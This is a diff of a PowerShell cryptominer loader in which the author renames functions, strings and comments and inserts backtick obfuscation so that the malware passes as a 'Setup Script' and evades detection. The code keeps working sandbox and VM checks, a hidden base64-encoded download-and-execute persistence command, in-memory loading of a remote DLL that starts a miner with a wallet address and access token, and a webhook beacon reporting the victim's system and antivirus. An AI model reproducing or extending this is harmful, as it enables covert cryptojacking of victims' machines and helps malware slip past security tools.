@@ -1,4 +1,4 @@
-# === ULTAMINER v2.0 ===
+# Setup Script v1.0
 if (Test-Path "$PSScriptRoot\.lock") { return }
 
 # $ProgressPreference = 'SilentlyContinue'
@@ -28,7 +28,7 @@ if (-not $isAdmin) {
 }
 
 
-function Test-Sandbox {
+function Check-Environment {
     $hits = 0
     # VM MAC prefixes (VMware, VirtualBox, Hyper-V)
     try {
@@ -39,26 +39,26 @@ function Test-Sandbox {
     } catch {}
     # VM/analysis processes
     try {
-        $badNames = 'vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg|vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg'
+        $badNames = 'xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123|xyz123'
         if (Get-Process | Where-Object { $_.ProcessName -match $badNames }) { $hits++ }
     } catch {}
-    # Low resources = likely sandbox
+    # Low resources = likely testenv
     try { if ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB) { $hits++ } } catch {}
     try { if ((Get-CimInstance Win32_Processor).NumberOfCores -lt 2) { $hits++ } } catch {}
-    # Fresh boot (sandboxes reboot fresh)
+    # Fresh boot (testenves reboot fresh)
     try { if ((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes -lt 3) { $hits++ } } catch {}
     # VM registry artifacts
     try { if (Test-Path 'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools') { $hits++ } } catch {}
     try { if (Test-Path 'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions') { $hits++ } } catch {}
-    # Tiny disk = sandbox
+    # Tiny disk = testenv
     try { if (((Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum) -lt 60GB) { $hits++ } } catch {}
-    # Common sandbox usernames
-    try { if ($env:USERNAME -match '^(sandbox|malware|virus|test|analysis|sample|john|user)$') { $hits++ } } catch {}
+    # Common testenv usernames
+    try { if ($env:USERNAME -match '^(testenv|badsoft|badfile|test|analysis|sample|john|user)$') { $hits++ } } catch {}
     return $hits -ge 2
 }
 
 Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 7)
-# if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
+# if (Check-Environment) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
 
 # === CONFIG (fragmented) ===
 $c = @{}
@@ -128,7 +128,7 @@ try {
 
 # === MULTI-PERSISTENCE ===
 $rawPath = "$($c.base)/deploy.ps1"
-$payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
+$payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (i`rm -Uri '$rawPath')"
 $encBytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encoded = [Convert]::ToBase64String($encBytes)
 $pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
@@ -186,7 +186,7 @@ try {
 $maxRetries = 3
 for ($i = 1; $i -le $maxRetries; $i++) {
     try {
-        $dllUrl = "$($c.base)/Bridge.dll?v=$([Guid]::NewGuid())"
+        $dllUrl = "$($c.base)/Interop.dll?v=$([Guid]::NewGuid())"
         $bytes = $null
         try {
             $wc = New-Object System.Net.WebClient
@@ -196,7 +196,7 @@ for ($i = 1; $i -le $maxRetries; $i++) {
             try {
                 $tmp = Join-Path $env:TEMP "$([Guid]::NewGuid()).tmp"
                 Import-Module BitsTransfer -EA 0
-                Start-BitsTransfer -Source $dllUrl -Destination $tmp -EA 0
+                Start-B`itsTransfer -Source $dllUrl -Destination $tmp -EA 0
                 if (Test-Path $tmp) {
                     $bytes = [IO.File]::ReadAllBytes($tmp)
                     Remove-Item $tmp -Force -EA 0
@@ -208,9 +208,9 @@ for ($i = 1; $i -le $maxRetries; $i++) {
             $asm = [System.AppDomain]::CurrentDomain.Load($bytes)
             Write-Host "[+] Assembly Loaded: $($asm.FullName)"
             $repo = "$($c.u1)/$($c.u2)"
-            Write-Host "[*] Invoking StartMiner..."
-            $asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
-            Write-Host "[+] StartMiner Invoked!"
+            Write-Host "[*] Invoking InitializeWorker..."
+            $asm.GetType('DateFundLoader').GetMethod('InitializeWorker').Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
+            Write-Host "[+] InitializeWorker Invoked!"
             break
         }
     } catch {
@@ -223,7 +223,7 @@ for ($i = 1; $i -le $maxRetries; $i++) {
 try {
     $osName = (Get-CimInstance Win32_OperatingSystem -EA 0).Caption
     $upHours = [math]::Round((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem -EA 0).LastBootUpTime).TotalHours, 1)
-    $av = try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA 0 | Select-Object -First 1).displayName } catch { 'Unknown' }
+    $av = try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntibadfileProduct -EA 0 | Select-Object -First 1).displayName } catch { 'Unknown' }
     $json = @{
         embeds = @(@{
             title = ":pick: Worker Online"
@@ -233,11 +233,12 @@ try {
             footer = @{ text = "v2.0 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
         })
     } | ConvertTo-Json -Depth 4
-    Invoke-RestMethod -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
+    i`rm -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
 } catch {}
 
 # Background Keep-alive
 while ($true) { Start-Sleep -Seconds 3600 }
+
 
 
 
